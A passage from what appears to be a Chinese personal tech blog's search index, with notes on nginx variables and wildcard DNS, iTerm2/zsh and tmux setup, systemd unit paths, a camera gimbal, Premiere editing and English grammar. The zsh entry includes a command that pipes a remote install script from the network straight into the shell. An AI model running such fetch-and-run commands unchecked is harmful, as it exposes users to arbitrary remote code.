https://echo.xuexb.com/                                      |\n| `http_upgrade_insecure_requests` | 是一个请求首部，用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应，并且它可以成功处理 upgrade-insecure-requests CSP 指令 | 1                                                            |\n| `http_user_agent`                | 用户设备标识                                                 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36` |\n| `http_x_requested_with`          | 异步请求标识                                                 | true                                                         |\n| `http_x_forwarded_for`           | 反向代理原 IP                                                | 198.13.61.105                                                |\n\n\n\n### 4. 链接相关\n\n| 变量名           | 备注                                                         | 示例                                                       |\n| ---------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |\n| `scheme`         | 请求使用的 WEB 协议                                          | http                                                       |\n| `uri`            | 请求中的当前 URI(不带请求参数)，可以不同于浏览器传递的 `$request_uri` 的值，它可以通过内部重定向，或者使用 `index` 指令进行修改 | `/api/dump/path`                                           |\n| `document_uri`   | 同 `$uri`                                                    | `/api/dump/path`                                           |\n| `request_uri`    | 这个变量等于包含一些客户端请求参数的原始 URI ，它无法修改    | `/api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84` |\n| `request_method` | HTTP 请求方法                                                | GET                                                        |\n| `request_time`   | 处理客户端请求使用的时间，从读取客户端的第一个字节开始计时   | 0.000                                                      |\n| `request_length` | 请求的长度（包括请求地址、请求头和请求主体）                 | 678                                                        |\n| `args`           | 请求参数                                                     | `a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84`                |\n| `query_string`   | 同 `$args`                                                   |                                                            |\n| `is_args`        | 请求中是否有参数，有则为 `?` 否则为空                        | `?`                                                        |\n| `arg_参数名`     | 请求中具体的参数                                             | `$arg_a` => `1`                                            |\n| `https`          | 如果开启了 SSL 安全模式，则为 `on` 否则为空                  | `on`                                                       |\n\n\n\n### 5. 参考资料\n\n+ https://xuexb.github.io/learn-nginx/variable/\n+ https://nginx.org/en/docs/\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx泛域名解析","url":"%2Fp%2Fd039.html","content":"\n\n\n### 1. 域名概念\n\n##### 1.1 二级域名\n\n二级域名是指顶级域名之下的域名, 见下面的例子:\n\n- .com 顶级域名\n  - liuvv.com 一级域名(你花钱申请的)\n    - www.liuvv.com 二级域名\n    - blog.liuvv.com 二级域名\n    - 依次类推...\n\n有几点需要注意下:\n\n1. www.liuvv.com是属于二级域名,不过一般我们把这个域名配置指向一级域名访问.\n2. www.liuvv.com/news这种形式一般称之为网站的子页面子目录等,并不是二级域名.\n3. 另外类似.com.cn, .net.cn, .org.cn这种称之为二级域.\n\n##### 1.2 域名泛解析\n\n我们的目的是实现访问二级域名后转发请求.首先要实现的是二级域名的配置,一般使用Nginx泛解析来处理. 泛解析即利用通配符*来做次级域名以实现所有的次级域名均指向同一IP地址。\n\n泛解析的用途有:\n\n1. 可以让域名支持无限的子域名(这也是泛域名解析最大的用途)。\n2. 防止用户错误输入导致的网站不能访问的问题。\n3. 可以让直接输入网址登陆网站的用户输入简洁的网址即可访问网站。\n\n<!-- more -->\n\n##### 1.3 域名类型\n\n![1](nginx泛域名解析/5.png)\n\n+ 无论记录类型为啥, 主机记录都填写 xxxxx.liuvv.com\n+ 主机记录就是域名前缀，常见用法有：\n  + www：解析后的域名为 `www.liuvv.com`\n  + @：直接解析主域名 `liuvv.com`\n  + \\*：泛解析，匹配其他所有域名 `*.liuvv.com`\n  \n+ 记录类型的含义是什么？\n\n  + **A 记录：**地址记录，用来指定域名的 IPv4 地址（例如`8.8.8.8`），如果需要将域名指向一个 IP 地址，就需要添加 A 记录。\n\n  + **CNAME 记录：** 如果需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。(github page 就是用的这种)\n\n  + **NS 记录：**域名服务器记录，如果需要把子域名交给其他 DNS 服务商解析，就需要添加 NS 记录。\n\n  + **AAAA 记录：**用来指定主机名（或域名）对应的 IPv6 地址（例如 `ff06:0:0:0:0:0:0:c3`）记录。\n\n  + **MX 记录：**如果需要设置邮箱，让邮箱能收到邮件，就需要添加 MX 记录。\n\n  + **TXT 记录：**如果希望对域名进行标识和说明，可以使用 TXT 记录，绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件）。\n\n  + **SRV 记录：**SRV 记录用来标识某台服务器使用了某个服务，常见于微软系统的目录管理。主机记录处格式为：服务的名字.协议的类型。例如： `_sip._tcp`。\n\n  + **隐、显性 URL 记录：**将一个域名指向另外一个已经存在的站点，就需要添加 URL 记录。\n\n\n+ 记录值如何填写？\n\n  + **A 记录：**填写您服务器 IP，如果您不知道，请咨询您的空间商。\n\n  + **CNAME 记录：**填写空间商给您提供的域名，例如：`2.com`。\n\n  + **MX 记录：**填写您邮件服务器的 IP 地址或企业邮箱给您提供的域名，如果您不知道，请咨询您的邮件服务提供商。\n\n  + **AAAA 记录：**不常用，解析到 IPv6 的地址。\n\n  + **NS记录：**不常用，系统默认添加的两个 NS 记录请不要修改。NS 向下授权，填写 DNS 域名，例如：`ns3.dnsv3.com`。\n\n  + **TXT 记录：**记录值并没有固定的格式，不过大部分情况下，TXT 记录是用来做 SPF 反垃圾邮件的。最典型的 SPF 格式的 TXT 记录例子为 “`v=spf1 a mx ~all`”，表示只有这个域名的 A 记录和 MX 记录中的 IP 地址有权限使用这个域名发送邮件。\n\n  + **SRV 记录：**记录值格式为：优先级 权重 端口 主机名。例如：`0 5 5060 sipserver.example.com` 。\n\n  + **隐、显性 URL 记录：**记录值为必须为整的地址（必须带有协议、域名，可以包含端口号和资源定位符）。\n\n+ TTL如何填写\n\n  TTL即 Time To Live，缓存的生存时间。指地方 DNS 缓存您域名记录信息的时间，缓存失效后会再次到 DNSPod 获取记录值。我们默认的 600 秒是最常用的，不用修改。\n\n  - 600（10分钟）：建议正常情况下使用 600。\n\n  - 60（1分钟）：如果您经常修改 IP，修改记录一分钟即可生效。长期使用 60，解析速度会略受影响。\n\n  - 3600（1 小时）：如果您 IP 极少变动（一年几次），建议选择 3600，解析速度快。如果要修改 IP，提前一天改为 60，即可快速生效。\n\n    \n\n\n### 2. 域名配置\n\n##### 2.1 配置泛解析\n\n去域名提供商那里先配置一个泛解析地址,记录类型为A.域名指向一个IPv4地址.主机记录设置为*.记录值填写服务器公网Ip地址.\n\n配置好后稍微等待一下,然后访问这个域名.可以随意输入任何二级域名,访问到的都应该是顶级域名的内容.我这里访问结果总是Nginx的默认页面.\n\n![1](nginx泛域名解析/2.png)\n\n\n\n##### 2.2 nginx server_name\n\nnginx http模块 server模块的 `server_name`指令主要用于配置基于名称的虚拟主机.匹配顺序不同结果不同.\n\na. 精准的server_name配置,如:\n\n```\nserver_name liuvv.com www.liuvv.com;\n```\n\nb. 以通配符*开始的字符串:\n\n```\nserver_name *.liuvv.com;\n```\n\nc. 以通配符*结束的字符串:\n\n```\nserver_name www.*;\n```\n\nd. 配置正则表达式:\n\n```\nserver_name ~^(?.+)\\.liuvv\\.com$;\n```\n\n匹配顺序由上至下,只要有一项匹配以后就会停止搜索.使用时要注意这个顺序\n\n\n\n##### 2.3 绑定子域名到不同目录\n\n通过匹配subdomain, 在下面的可以通过$subdomain这个变量获取当前子域名称。\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        server_name  ~^(?<subdomain>.+)\\.liuvv\\.com$;\n        root /home/levonfly/www/$subdomain;\n        index index.html;\n\n        location / {\n                try_files $uri $uri/ =404;\n        }\n\n}\n```\n\n\n\n\n![1](nginx泛域名解析/3.png)\n\n\n\n![1](nginx泛域名解析/4.png)\n\n\n\n##### 2.4 绑定子域名到不同目录(多个配置文件)\n\n![1](nginx泛域名解析/6.png)\n\n\n\n\n\n### 3. 参考资料\n\n+ [Nginx 泛解析配置请求映射到多端口实现二级域名访问](https://www.cnblogs.com/summit7ca/p/6974215.html)\n+ http://www.ruanyifeng.com/blog/2016/06/dns.html\n+ https://cloud.tencent.com/document/product/302/3468","tags":["nginx"],"categories":["nginx"]},{"title":"iterm2_zsh配置","url":"%2Fp%2F6600d67c.html","content":"\n先上下效果图\n\n![1](iterm2_zsh配置/3.png)\n\n![1](iterm2_zsh配置/2.png)\n\n\n\n### 1. 配色iterm2\n\n```bash\nhttps://github.com/mbadolato/iTerm2-Color-Schemes # 这上面好多, 慢慢挑\nhttps://github.com/dracula/dracula-theme/ # 选用的这个\nhttps://github.com/MartinSeeler/iterm2-material-design \n```\n\n<!-- more -->\n\n### 2. 安装zsh\n\n```\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n```\n\n\n\n### 3. 修改主题 powerlevel9k\n\n```bash\ncd ~/.zgen/robbyrussell/oh-my-zsh-master/themes\ngit clone https://github.com/bhilburn/powerlevel9k/\n\n.zshrc\nZSH_THEME=\"powerlevel9k/powerlevel9k\"\n```\n\n\n\n### 4. 设置字体\n\n```bash\n# powerline\ngit clone https://github.com/powerline/fonts\n./install.sh\n\n# awesome-terminal-font\ngit clone https://github.com/gabrielelana/awesome-terminal-fonts\n打开build文件夹双击安装\n\n# nerd-fonts, 装这个即可\nhttps://github.com/ryanoasis/nerd-fonts/\n\nbrew tap homebrew/cask-fonts\nbrew cask install font-hack-nerd-font\n```\n\n\n\n然后在iterm2里面，把字体改成后缀为powerline的字体就行了\n\n![1](iterm2_zsh配置/1.png)\n\n\n\n\n\n### 5. 主题配置\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel9k/powerlevel9k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context battery dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status time dir_writable ip public_ip ram load background_jobs)\n```\n\n\n\n### 6. zsh 安装插件\n\n```bash\n#1. git\n.zshrc\nplugins=(git)\n\n#2. autojump\nbrew install autojump #使用上就是 j xxx_Tab\n\n.zshrc\n[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] && . $(brew --prefix)/etc/profile.d/autojump.sh\n\n\n#3. 自动补充命令\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n.zshrc\nplugins=(zsh-autosuggestions)\n\n#4. 命令语法高亮\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n.zshrc\nplugins=(zsh-syntax-highlighting)\n\n#5. colors\ngem install colorls\n\n.zshrc\nsource $(dirname $(gem which colorls))/tab_complete.sh\n```\n\n\n\n### 7. 遇到的问题\n\n- 图案不显示\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete' #这句话一定要在下面source之前\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n### 8. 参考资料\n\n+ [打造 Mac 下高颜值好用的终端环境](https://blog.biezhi.me/2018/11/build-a-beautiful-mac-terminal-environment.html)\n\n+ https://medium.com/@Clovis_app/configuration-of-a-beautiful-efficient-terminal-and-prompt-on-osx-in-7-minutes-827c29391961\n\n\n","tags":["iterm2"],"categories":["iterm2"]},{"title":"iterm2上tmux和oh_my_tmux的使用","url":"%2Fp%2F29f1e79c.html","content":"\ntmux是一款优秀的终端复用软件，它比Screen更加强大。 tmux之所以受人们喜爱，主要得益于以下功能：\n\n- 丝滑分屏（split），虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。\n\n- 保护现场（attach），即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。\n\n<!-- more -->\n\n+ 上下效果图\n\n![1](tmux/1.png)\n\n![1](tmux/2.png)\n\n\n\n### 1. tmux 安装\n\n```bash\nbrew install tmux #mac\n\napt-get install tmux #linux\n```\n\n\n\n安装成功后, 需要再安装一个插件:   https://github.com/gpakosz/.tmux\n\n```bash\ncd\ngit clone https://github.com/gpakosz/.tmux.git\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n```\n\n\n\n以后配置修改   ~/.tmux.conf.local 即可. \n\n\n\n### 2. tmux 配置\n\n```bash\ntmux source-file ~/.tmux.conf # 刷新配置\n\nset-option -g prefix2 `  # 设置一个不常用的`键作为指令前缀，按键更快些, 建议用 ctrl+a\n\nset -g mouse on  # 最好关掉, 要不然影响iterm2自带鼠标选中\n```\n\n\n\n Oh My Tmux 快捷键\n\n```bash\n自动把 ctrl + a 当做第二个前缀\n\n<prefix> m #切换鼠标开启状态\n\n<prefix> e #自动打开配置\n\n<prefix> r # 刷新配置\n\n<prefix> C-c  #新建一个 Session\n\n<prefix> C-h 和 <prefix> C-l # 向左向右切换 window\n\n<prefix> Tab #回到上一个 window\n\n<prefix> - 和 <prefix> _  #水平和垂直分屏\n\n<prefix> h, <prefix> j, <prefix> k and <prefix> l    #移动 panel\n\n<prefix> + #让当前 panel 成为 window, 注意 再一次还能回到 panel\n```\n\n\n\n修改Oh My Tmux 配置\n\n```bash\ntmux_conf_new_window_retain_current_path=true  #window保持路径\ntmux_conf_new_pane_reconnect_ssh=true  #重新连接 ssh\ntmux_conf_new_session_prompt=true  #新建 session 输入名字\n\ntmux_conf_theme_status_left=' ❐ #S '  #左边状态栏精简\ntmux_conf_theme_status_right='#{prefix}#{pairing}#{synchronized} #(curl wttr.in?format=3) | %Y-%m-%d | %H:%M:%S | w-#(echo $(((%j/7)+(%j%7>0)))) , %a' # 右边显示天气, 和week of year\ntmux_conf_theme_prefix='🍎 🍐 🍊 🍋 🍌 🍉 '  # 前缀显示emoji\n\n\n增加配置\n\nbind N previous-window # 上一个窗口\nbind n next-window # 下一个窗口\n\nbind-key -n C-S-Left swap-window -t -1 # Ctrl+Shift+Left  window向左(不需要prefix)\nbind-key -n C-S-Right swap-window -t +1 #  Ctrl+Shift+Left window向右(不需要prefix)\n\n#bind-key x kill-pane # 关闭确认\n#bind-key & kill-window # 关闭确认\n\nset-option -g status-position top # 状态栏放到上面\n\nset -g status-right 'Continuum status: #{continuum_status}'\nset -g @continuum-save-interval '10'\nset -g @continuum-restore 'on'\n\n# List of plugins\nset -g @tpm_plugins '          \\\n\ttmux-plugins/tpm             \\\n\ttmux-plugins/tmux-resurrect  \\\n\ttmux-plugins/tmux-continuum  \\\n'\n# Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)\nrun '~/.tmux/plugins/tpm/tpm'\n```\n\n\n\n### 3. tmux 使用\n\ntmux使用C/S模型构建，主要包括以下单元模块：\n\n- server服务器。输入tmux命令时就开启了一个服务器。\n- session会话。一个服务器可以包含多个会话\n- window窗口。一个会话可以包含多个窗口。\n- pane面板。一个窗口可以包含多个面板。\n\n\n\n我习惯一个项目用一个 session, 一个工作区用一个 window, 快捷操作开始一个 panel. 如果刚开始记不住 tmux的操作, 一定多练习, 一定多用, 你会发现离不开它了.\n\n\n\n#### 3.0 tmux 命令\n\n```bash\ntmux ls # 查看当前所有的session\n\ntmux\t# 新建一个无名称的会话, 可以用$再改名\n\ntmux new -s demo # 新建一个名称为demo的会话, \n\ntmux attach -t session_name # 连接之前退出的session\n\ntmux attach-session  # 快速进入 session\n\ntmux kill-server  #关闭服务器，所有的会话都将关闭\n```\n\n\n\n#### 3.1 session操作\n\n+ 新建 <prefix> C-c   或     :new \n\n+ 删除  :kill-session  或  tmux ls 以后 tmux kill-session -t 名字\n\n+ 选择 s\n\n+ 重命名 $\n\n+ 退出  d\n\n\n\n#### 3.2 window 操作\n\n\n\n+ 新建   c\n+ 关闭  ctrl+d 或   &\n+ 列表  w   可切到其他 session\n\n+ 重命名  ,\n\n+ 跳跃  0-9\n+ 向左 C-h  或   n\n+ 向右 C-l  或   p\n\n\n\n#### 3.3 panel 操作\n\n+ 新建上下   - 或  \"\n\n+ 新建左右   _  或 %\n\n+ 关闭  ctrl+d  或 x\n\n+ 切换： 空格键\n\n+ 移动    hjkl 键 或 上下左右键\n\n+ 最大化  z\n\n+ 变窗口  !   如果只是临时变 window, 用+\n\n  \n\n### 4. tmux 遇到的问题\n\n1. off, 鼠标无法滚动\n\n   In iTerm2 all you need to do is to go to Preferences > Profile > Terminal and check ‘Save lines to scrollback when an app status bar is present’.\n\n2. on, 鼠标无法智能选中\n\n   快速关闭, m\n\n3. 无论off, on  鼠标点击文件不是默认 app 打开\n\n   https://stackoverflow.com/a/56715244/7062454\n\n   自己强答一题: 先退出 tmux seesion, 用鼠标点击通过默认 app 打开, 再进入 tmux session 就可以了\n\n\n\n### 5. tmux 插件\n\n+ tpm\n\n```bash\ngit clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm\n```\n\n+ tmux-resurrect\n\n```bash\n<prefix> ctrl + s #save\n<prefix> ctrl + r #load\n```\n\n\n\n### 6. 参考资料\n\n进阶: http://louiszhai.github.io/2017/09/30/tmux/","tags":["tmux"],"categories":["iterm2"]},{"title":"/etc/systemd/system和/lib/systemd/system的区别","url":"%2Fp%2Fc1403091.html","content":"\n\n\n### 1. 区别\n\n##### 1.1 [/usr]/lib/systemd/system/  (软件包安装的单元)\n\nThe expectation is that `/lib/systemd/system` is a directory that should only contain systemd unit files which were put there by the package manager (YUM/DNF/RPM/APT/etc).\n\n##### 1.2 /etc/systemd/system/(系统管理员安装的单元, 优先级更高)\n\nFiles in `/etc/systemd/system` are manually placed here by the operator of the system for ad-hoc software installations that are not in the form of a package. This would include tarball type software installations or home grown scripts.\n\n### 2. 优先级\n\nsystemd的使用大幅提高了系统服务的运行效率, 而unit的文件位置一般主要有三个目录：\n\n```\n       Table 1.  Load path when running in system mode (--system).\n       ┌────────────────────────┬─────────────────────────────┐\n       │Path                    │ Description                 │\n       ├────────────────────────┼─────────────────────────────┤\n       │/etc/systemd/system     │ Local configuration         │\n       ├────────────────────────┼─────────────────────────────┤\n       │/run/systemd/system     │ Runtime units               │\n       ├────────────────────────┼─────────────────────────────┤\n       │/lib/systemd/system     │ Units of installed packages │\n       └────────────────────────┴─────────────────────────────┘\n```\n\n<!-- more -->\n\n这三个目录的配置文件优先级依次从高到低，如果同一选项三个地方都配置了，优先级高的会覆盖优先级低的。 \n\n系统安装时，默认会将unit文件放在`/lib/systemd/system`目录。如果我们想要修改系统默认的配置，比如`nginx.service`，一般有两种方法：\n\n1. 在`/etc/systemd/system`目录下创建`nginx.service`文件，里面写上我们自己的配置。\n2. 在`/etc/systemd/system`下面创建`nginx.service.d`目录，在这个目录里面新建任何以.conf结尾的文件，然后写入我们自己的配置。推荐这种做法。\n\n`/run/systemd/system`这个目录一般是进程在运行时动态创建unit文件的目录，一般很少修改，除非是修改程序运行时的一些参数时，即Session级别的，才在这里做修改。\n\n\n\n参考资料:\n\n+ https://unix.stackexchange.com/questions/206315/whats-the-difference-between-usr-lib-systemd-system-and-etc-systemd-system\n+ https://wiki.archlinux.org/index.php/Systemd","tags":["systemd"],"categories":["系统"]},{"title":"智云云鹤2_crane2教程","url":"%2Fp%2F3bad91c1.html","content":"\n\n\n### 1. 安装\n\n+ 安装电池\n+ 拧上三脚架\n\n### 2. 平衡\n\n调节平衡之前需要先认清三个轴:\n\n+ 俯仰轴   相机的右侧的那个圆圈(转动改变角度)\n\n+ 横滚轴   后方写着智云字体的那个圆圈(貌似不会转动,倾斜改变角度)\n\n+ 航向轴   手柄上方的那个圆圈(转动改变角度)\n\n  \n\n##### 2.1 调节平衡\n\n+ 先调节俯仰轴水平, 前后移动快装板, 松手水平后拧紧快装板螺丝\n+ 再调节俯仰轴垂直, 松手垂直后拧紧俯仰轴螺丝\n+ 再调节横滚轴, 松手水平后拧紧横滚轴螺丝\n+ 最后调节航向轴, 把三脚架怼着肚子,松手水平后拧紧航向轴螺丝\n\n<!-- more -->\n\n### 3. APP\n\n+ ZY Play(可以控制crane2)\n+ 智云掌上助手 (貌似只能看角度)\n\n\n\n#### 4. SONY\n\n+ 连接相机线, 先开稳定器, 再开相机\n+ camera修改相机为 sony, false(不为相机供电, 对给相机备电池)\n+ 电源键录像, 确认键拍照\n+ 跟焦不支持,可以用外置伺服跟焦器(没啥卵用)\n\n\n\n### 5. 模式\n\n##### 5.1 PF 左右跟随模式 (一直保持水平)===>需要自己控制左右转\n\n+ 俯仰和横滚锁定, 水平方向随着手柄转动\n\n+ 向上和向下改变仰角\n\n##### 5.2 L 全锁定模式 (保持水平和垂直)===>需要自己控制任何方向\n\n+ 三个轴都锁定\n\n+ 向上和向下改变仰角\n\n+ 向左和向右改变朝向\n\n##### 5.3 F 全跟随模式 (水平和垂直都活)===>控制好自己\n\n+ 横滚锁定\n+ 俯仰和朝向随手柄转动\n+ 向左和向右改变横滚角度\n\n##### 5.4 POV 第一视角模式(360度无死角)===>自己转手柄对准(难度高)\n\n+ 上下画圈旋转\n+ 手柄顺时针和逆时针转动\n+ 定器手柄顶端作定向点，手柄末端作转向点\n\n##### 5.5 V 三围梦境模式===>握紧手柄,点按钮翻转\n\n+ 前进/后退中按钮旋转\n+ 向左和向右旋转相机\n+ 即使三维梦境的拍摄效果是画面的顺/逆时针旋转，但实际稳定器的运动轨迹并非是横滚轴，而是航向轴 。\n+ 在拍摄前需注意进行相机调平，尤为是容易被忽略的航向轴调平，以便发挥稳定器的最大功率实现完美拍摄。\n\n\n\n#### 6. 配件\n\n+ 外置伺服跟焦器, 因为sony 不支持跟焦, 可以用作物理跟焦, 已挂闲鱼\n+ 鳞甲监视器, 需要另购买配件(蛇管怪手), 已挂闲鱼","tags":["photo"],"categories":["摄影"]},{"title":"pr入门教程笔记","url":"%2Fp%2Fe24658ca.html","content":"\n\n\n\n### 0. 安装\n\n+ windows\n\n+ mac\n\n### 1. 基础操作\n\n##### 1.1 软件\n\n+ 新建项目\n+ 窗口->工作区->重置\n+ 首选项->自动保存\n\n<!-- more -->\n\n##### 1.2 导入\n\n+ 双击\n+ 右键->导入\n+ 拖到文件夹->导入(提前归类好文件夹资源)\n\n##### 1.3 序列\n\n+ 手动新建序列, 如1080P 25fps….\n+ 直接通过资源来创建序列\n+ v1,v2,v3 视频段,  a1,a2,a3 音频段\n+ 视频可以开关小眼睛关闭, 音频可以m静音\n+ 可以上下推拉, 调整序列段的宽度\n+ 速度/\b持续时间 可制作升格降格, 序列前面会出现fx标识, (拍摄100ps, 降低到25ps)\n+ 序列可以拖动并入之前的系列\n\n##### 1.4 操作\n\n+ M标记 -> 剪刀裁剪 -> 波纹删除 \n+ alt 按序列段 -> 拖到 -> 复制\n\n##### 1.5 转场\n\n+ 效果 -> 视频过渡 -> 拖动 -> 放在两个段中间\n+ 常用的是 交叉溶解\n\n##### 1.6 音效\n\n+ 点中音乐段, 左上角调节级别(控制音量, 负无穷到正无穷)\n+ 点击前面的小闹钟, 然后再K帧, 可以制作音量的变化\n\n##### 1.7 字幕\n\n+ 窗口 -> 字幕 -> 新建字幕\n\n##### 1.8 导出\n\n+ 文件 -> 导出 -> H.264(mp4格式)\n+ 通过调节比特率/最大比特率 可以降低文件的大小\n\n### 2. 快捷键\n\n+ v 选择\n+ c 剪刀\n+ m 标记\n+ ~ 全屏\n+ space 播放/暂停\n+ 左右箭头  手动走帧\n+ alt+鼠标滚轮  放大缩小序列\n+ del 删除\n\n### 3. 插件\n\n+ 磨皮插件 Digital Anarchy Beauty Box\n\n  + show mask\n\n  + 吸取低颜色和高颜色\n  + 调节第二个参数(skin detail amount?), 加大磨皮\n\n### 4. 遇到的问题\n\n+ Q: 音效帧无法控制\n\n  A: 把效果->级别上面的那个属性(Bypass/旁路)给关闭\n\n+ Q: 无法删除视频转场\n\n  A: 把视频段宽度降低或增大, 点击转场文字,删除\n\n### 5. 技巧\n\n+ 序列归类合并\n\n  1. 每个音频可以新建一个同名序列, 然后剪辑后形成新的序列\n\n  2. 最后新建一个序列, 把之前的序列都拖到过来\n\n  3. 如果视频比较大, 可以把步骤1的序列导出为视频, 再进行第二个步骤\n\n+ 剪辑收尾\n  1. 音效K帧变负无穷\n  2. 可以导出帧,形成一个png, 停留几秒\n\n### 6. 参考教程\n\n+ https://www.bilibili.com/video/av8703816/","tags":["photo"],"categories":["摄影"]},{"title":"英语语法结构","url":"%2Fp%2Fd2e27e6.html","content":"\n# 一. 句子结构\n\n主语: Subject -> 动作的发出者\n\n谓语: Verb -> 动作\n\n宾语: Object -> 动作的承受者\n\n\n\n### 1.1 简单句:  主语 + 谓语 + 宾语\n\n### 1.2 并列句:  主谓宾 + 并列词 + [主]谓宾\n\n+ 并列词: and, or, but, not only…but also\n\n+ 两个句子是同等地位\n\n### 1.3 复合句:  主谓宾(主句) + 从句引导词 + 主谓宾(从句)\n\n+ 从句引导词: which, when, where\n\n+ 主句是主导地位, 从句是从属地位\n+ 从句类型:\n  + 名词性从句(名词)\n  + 定语从句(形容词)\n  + 状语从句(副词)\n\n#### 1.4 总结\n\n+ 句子必须有谓词\n+ 一个简单句子不能出现多个谓词\n\n<!-- more -->\n\n# 二. 简单句的变种(六个句型)\n\n### 2.1 主 + 谓 + 宾\n\n+ 主: 名词\n\n+ 谓: 及物动词(后面可以接物体)\n+ 宾: 名词\n\n### 2.2 主 + 谓\n\n+ 谓: 不及物动词(后面不接物体)\n\n### 2.3 主 + 系 + 表\n\n+ 系: 系动词\n\n  + Be 动词 am, is, are, was, were\n\t+ 感官动词(五官)\n  \t\n\t\t+ look(看起来), sound(听起来),smell(闻起来), taste(尝起来), feel(感觉)\n\t+ 变化动词\n\t  + become(变得), turn(变成), go(变得), get(变得), grow(成长)\n\t+ 静止动词\n  + stay, remain, keep\n+ 表语\n  + 名词\n  + 形容词\n  + 不定式(to do 不定式)\n  + 介宾\n    + 介词:  in on to\n    + 介词 + 动名词\n\n\n\n### 2.4 主 + 谓 + 宾 + 宾(作用于多个承受者)\n\nI give you money.\n\n### 2.5 主 + 谓 + 宾 + 补(结构完整,意思不完整)\n\nThe music makes me sad.\n\n+ 主: 名词\n+ 谓: 及物动词\n+ 宾: 名词\n+ 补:\n  + 形容词\n  + to do 不定式\n\n### 2.6 There be + 名词 + [介宾] (表达存在)\n\nThere is a dog.  //这里有条狗 (有是存在的意思, 不是 have 的意思)\n\nThere is a dog under the tree. //树下有条狗\n\n\n\n# 三. 从句: 引导词+主谓宾(小弟)\n\n\n\n### 3.1 名词性从句(句子的名词复杂)\n\n+ 一模一样的句子, 只不过位置不同, 所以名称不同\n\n+ 引导词 + 从句 降级变成了名词\n\n\n| 主                   | 谓       | 宾                   |\n| -------------------- | -------- | -------------------- |\n| 名词                 | 及物动词 | 名词                 |\n| 如果在这里->主语从句 |          | 如果在这里->宾语从句 |\n\n##### 1 主语从句\n\nThat he likes football surprised us.\n\n##### 2 宾语从句\n\nHe said that he likes football.\n\n##### 3 表语从句\n\nThe fact is that he likes football.\n\n##### 4 同位语从句(引导词常见 that)\n\n同位语是解释名词的名词, 2个名词地位相等\n\n同位语:\n\n+ Levon, a love man, loves spring. (同位语主语)\n\n+ Levon loves spring, one of  the four. (同位语宾语)\n\n同位语从句:\n\n+ The fact, that he likes football suprised us.\n\n+ He states the fact that he likes football.\n\n\n\n\n### 3.2 定语从句(修饰句子的某个名词)\n\n定语: 修饰名词, 分为两种: \n\n定1: 形容词(短一些)\n\n定2: 短语(介宾或 to do 不定式)或定语从句(长一些)\n\n+ 英语不喜欢头重脚轻的句子, 如果是, 请变成头轻脚重, 长的在名词后面放着\n+ (定1 主语 定2)  + 谓语 + (定1 + 宾语 + 定2)\n\n定语例子: \n\n+ A beautiful(定1) girl shard a facinating story.\n\n+ A gril from Mars(定2短语) shard a story about her people(定2短语).\n+ A task to tackle(定2短语) is the potatial(定1) creiss.\n\n定语从句例子:\n\n+ A girl who likes spring(定2从句) shard a story which moved us(定2从句).\n+ A beautiful(定1) girl from Mas(定2短语) who likes spring(定2从句) shard a faciting(定1) story about her people(定2短语) which moved us(定2从句).\n\n\n\n### 3.3 状语从句(修饰句子的某个动词或形容词)\n\n+ 就是副词, 修饰动词, 形容词或整个句子\n\n+ 起副词作用的句子就是状语从句\n\n##### 1  时间状语\n\n何时\n\n##### 2 地点状语\n\n在哪\n\n##### 3 原因状语\n\n为啥\n\n##### 4 条件状语\n\n在什么情况下\n\n##### 5 目的状语\n\n为了啥\n\n##### 6 结果状语\n\n导致了啥\n\n##### 7 让步状语\n\n转折\n\n##### 8 方式状语\n\n怎么发生的 \n\n\n\n状语例子\n+ Levon smiles happily. (修饰动词, 副词在后)\n+ Levon quickly understand. (修辞动词, 副词在前)\n+ She is strikingly beautiful.(修饰形容词)\n+ He is 